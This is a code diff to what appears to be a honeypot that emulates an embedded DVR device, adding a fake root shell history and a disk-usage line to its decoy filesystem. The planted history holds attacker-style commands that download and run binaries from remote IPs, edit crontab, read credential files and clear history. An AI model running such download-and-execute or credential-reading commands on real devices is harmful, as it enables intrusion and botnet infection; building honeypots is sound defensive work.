@@ -111,6 +111,18 @@ _FILE_CONTENTS = {
         "busybox wget http://45.33.32.156/mips -O /tmp/mips\n"
         "history -c\n"
     ),
+    "/root/.bash_history": (
+        "wget http://192.168.1.100/update.sh\n"
+        "chmod +x /tmp/update.sh\n"
+        "/tmp/update.sh &\n"
+        "crontab -e\n"
+        "cat /mnt/mtd/Config/account.ini\n"
+        "cd /tmp && ls\n"
+        "curl http://45.33.32.156/mips -o /tmp/m && chmod 777 /tmp/m && /tmp/m\n"
+        "ps | grep -v grep\n"
+        "cat /root/passwords.txt\n"
+        "netstat -an | grep LISTEN\n"
+    ),
     "/etc/crontab": (
         "# /etc/crontab\n"
         "SHELL=/bin/sh\n"
@@ -675,6 +687,7 @@ class FakeShell:
             "/dev/root                30720     28456      2264  93% /\n"
             "tmpfs                    30720       124     30596   0% /tmp\n"
             "/dev/mtdblock3           10240      8192      2048  80% /mnt/mtd\n"
+            "/dev/sda1             15360000  14438400    921600  94% /mnt/dvr_rec\n"
         )
 
     def _cmd_uptime(self, args):
